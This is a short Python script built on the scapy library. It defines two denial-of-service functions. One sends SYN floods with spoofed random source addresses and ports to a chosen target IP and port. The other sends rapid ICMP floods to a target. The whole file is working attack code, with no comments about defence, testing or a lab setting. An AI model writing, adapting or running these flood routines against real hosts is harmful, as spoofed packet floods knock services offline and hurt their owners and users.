from scapy.all import IP, TCP, ICMP, send
import random
import time

def syn_flood(target_ip, target_port, count=100):
    print(f"[•] Sending SYN flood to {target_ip}:{target_port} ({count} packets)")
    for _ in range(count):
        src_port = random.randint(1024, 65535)
        src_ip = f"192.168.1.{random.randint(2, 254)}"
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="S")
        packet = ip / tcp
        send(packet, verbose=False)

    print("[✓] SYN flood completed.")

def icmp_flood(target_ip, count=100):
    print(f"[•] Sending ICMP flood to {target_ip} ({count} packets)")
    packet = IP(dst=target_ip)/ICMP()
    send(packet, count=count, inter=0.01, verbose=False)
    print("[✓] ICMP flood completed.")